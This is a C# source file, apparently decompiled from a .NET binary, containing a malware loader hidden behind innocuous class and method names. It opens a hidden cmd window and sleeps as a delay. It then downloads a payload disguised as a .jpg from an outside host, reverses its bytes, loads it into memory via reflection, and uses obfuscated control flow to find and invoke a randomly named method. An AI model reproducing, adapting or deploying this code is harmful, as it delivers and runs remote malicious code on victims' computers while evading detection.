using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Psmvvft;

internal class HelperUtilsWrapper
{
	private static HelperUtilsWrapper FillStub;

	internal static void MovePool()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/c ping yahoo.com",
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Thread.Sleep(TimeSpan.FromSeconds(20.0));
	}

	internal static void ReflectPool()
	{
		AppDomain appDomain = (AppDomain)typeof(AppDomain).GetProperty("CurrentDomain")!.GetValue(null, null);
		_ = (Assembly)PushStub(appDomain).InvokeMember("Load", BindingFlags.InvokeMethod, null, appDomain, new object[1] { SortPool() });
	}

	[SpecialName]
	internal static byte[] SortPool()
	{
		byte[] array = new BinaryReader(WebRequest.Create("https://kotadiainc.com/Zgcrnhtf.jpg").GetResponse().GetResponseStream()).ReadBytes(84621640);
		ConnectStub(typeof(Array).TypeHandle).GetMethod("Reverse", new Type[1] { typeof(Array) })!.Invoke(null, new object[1] { array });
		return array;
	}

	internal static bool CallPool()
	{
		int num2 = default(int);
		Type type = default(Type);
		int num3 = default(int);
		Type[] types = default(Type[]);
		while (true)
		{
			Assembly[] assemblies = ((AppDomain)DestroyStub()).GetAssemblies();
			int num = 0;
			if (_003CModule_003E_007B52fd7bfb_002D0a36_002D447c_002Da8c9_002Dfb0e861d2b11_007D.m_231a87dfe521496abb6af32aec6abfa7.m_7fabd0559c0844c1bec8571b76f15e1d == 0)
			{
				goto IL_0089;
			}
			goto IL_008e;
			IL_008e:
			switch (num)
			{
			case 2:
				break;
			default:
				goto IL_0089;
			case 1:
				continue;
			}
			goto IL_007b;
			IL_0089:
			num2 = 0;
			goto IL_003f;
			IL_007b:
			MethodInfo[] methods = type.GetMethods();
			foreach (MethodInfo methodInfo in methods)
			{
				if (methodInfo.Name == "Mbonuctkwvqgaqlghmzb")
				{
					return (bool)methodInfo.Invoke(null, null);
				}
			}
			num3++;
			goto IL_005a;
			IL_003f:
			if (num2 >= assemblies.Length)
			{
				break;
			}
			Assembly assembly = assemblies[num2];
			types = assembly.GetTypes();
			num3 = 0;
			goto IL_005a;
			IL_005a:
			if (num3 >= types.Length)
			{
				num2++;
				goto IL_003f;
			}
			type = types[num3];
			num = 2;
			if (_003CModule_003E_007B52fd7bfb_002D0a36_002D447c_002Da8c9_002Dfb0e861d2b11_007D.m_231a87dfe521496abb6af32aec6abfa7.m_b4c9b60dbec5463b934315cfc96c24fd != 0)
			{
				goto IL_007b;
			}
			goto IL_008e;
		}
		return false;
	}

	internal static bool UpdateStub()
	{
		return FillStub == null;
	}

	internal static HelperUtilsWrapper MapStub()
	{
		return FillStub;
	}

	internal static Type PushStub(object object_0)
	{
		return ((AppDomain)object_0).GetType();
	}

	internal static Type ConnectStub(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static object DestroyStub()
	{
		return AppDomain.CurrentDomain;
	}
}
